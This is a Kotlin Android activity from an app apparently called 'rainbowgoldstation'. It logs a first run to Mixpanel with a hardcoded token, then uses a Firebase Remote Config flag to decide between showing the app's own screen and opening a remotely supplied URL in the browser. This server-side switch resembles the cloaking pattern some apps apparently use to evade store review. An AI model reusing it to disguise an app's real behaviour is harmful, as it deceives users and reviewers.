package com.marlerino.rainbowgoldstation.view

import android.content.Intent
import android.net.ConnectivityManager
import android.net.NetworkInfo
import android.net.Uri
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import androidx.appcompat.app.AppCompatActivity
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import com.marlerino.rainbowgoldstation.R
import com.marlerino.rainbowgoldstation.viewmodel.DataManager
import com.mixpanel.android.mpmetrics.MixpanelAPI
import org.json.JSONException
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.Executors


class InitActivity : AppCompatActivity() {
    private lateinit var mp: MixpanelAPI
    private val defaultURL = prepareURL("ya.ru/")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_init)
        mp = MixpanelAPI.getInstance(this, "438e1bfba8176b88f456eaeed30a8554", false)
        sendDataAndCheckLink()
    }

    @Throws(JSONException::class)
    private fun sendDataAndCheckLink() {
        if (DataManager(this).getRunNum() == 0) {
            val executor = Executors.newSingleThreadExecutor()
            val handler = Handler(Looper.getMainLooper())
            executor.execute {
                val code = checkForResponseCode("https://mixpanel.com/")
                handler.post(Runnable {
                    if (code == 200) {
                        mp.track("First Run", JSONObject())
                        DataManager(this).saveRun()
                    }
                    checkForLink()
                })
            }
        } else {
            checkForLink()
        }
    }

    private fun checkForLink() {
        val config = DataManager(this).getConfig()
        if (config.isNotEmpty()) {
            val configValues = config.split("_")
            if (configValues[0] == "url") {
                openWebActivity(config.substring(4))
            } else {
                startActivity(Intent(this, JoinActivity::class.java))
            }
        } else {
            val remoteConfig: FirebaseRemoteConfig = Firebase.remoteConfig
            val configSettings = remoteConfigSettings {
                minimumFetchIntervalInSeconds = 60
            }
            remoteConfig.setConfigSettingsAsync(configSettings)
            remoteConfig.setDefaultsAsync(R.xml.remote_config_defaults)
            val connectivityManager = getSystemService(CONNECTIVITY_SERVICE) as ConnectivityManager
            val connected = connectivityManager.getNetworkInfo(ConnectivityManager.TYPE_MOBILE)!!
                .state == NetworkInfo.State.CONNECTED ||
                    connectivityManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI)!!.state == NetworkInfo.State.CONNECTED
            if (connected) {
                requestToFirebase(remoteConfig)
            } else {
                DataManager(this).saveConfig("application")
                startActivity(Intent(this, JoinActivity::class.java))
            }
        }
    }

    private fun requestToFirebase(remoteConfig: FirebaseRemoteConfig) {
        remoteConfig.fetchAndActivate()
            .addOnCompleteListener(this) { task ->
                if (task.isSuccessful) {
                    val flag = remoteConfig.getBoolean("flag")
                    val url = remoteConfig.getString("url")
                    processValues(flag, url)
                } else {
                    DataManager(this).saveConfig("application")
                    startActivity(Intent(this, JoinActivity::class.java))
                }
            }
    }

    private fun processValues(flag: Boolean, link: String) {
        if (flag && link == "") {
            DataManager(this).saveConfig("url_$defaultURL")
            openWebActivity(defaultURL)
        }else{
            val url = prepareURL(link)
            if (!flag) {
                DataManager(this).saveConfig("application")
                startActivity(Intent(this, JoinActivity::class.java))
            } else {
                val executor = Executors.newSingleThreadExecutor()
                executor.execute {
                    when (checkForResponseCode(url)) {
                        200 -> {
                            DataManager(this).saveConfig("url_$url")
                            openWebActivity(url)
                        }

                        404 -> {
                            DataManager(this).saveConfig("application")
                            startActivity(Intent(this, JoinActivity::class.java))
                        }

                        else -> {
                            startActivity(Intent(this, JoinActivity::class.java))
                        }
                    }
                }
            }
        }
    }

    private fun openWebActivity(url: String) {
        val intent =
            Intent(Intent.ACTION_VIEW, Uri.parse(url))
        if (intent.resolveActivity(packageManager) != null) {
            startActivity(intent)
        } else {
            startActivity(Intent(this, JoinActivity::class.java))
        }
    }

    private fun prepareURL(url: String): String {
        if (!url.contains("http://") && !url.contains("https://")) {
            return "https://$url"
        }
        return url
    }

    private fun checkForResponseCode(link: String): Int {
        try {
            val url = URL(prepareURL(link))
            val connection = url.openConnection() as HttpURLConnection
            connection.requestMethod = "GET"
            connection.connect()
            return connection.responseCode
        } catch (e: Exception) {
            return 404
        }
    }
}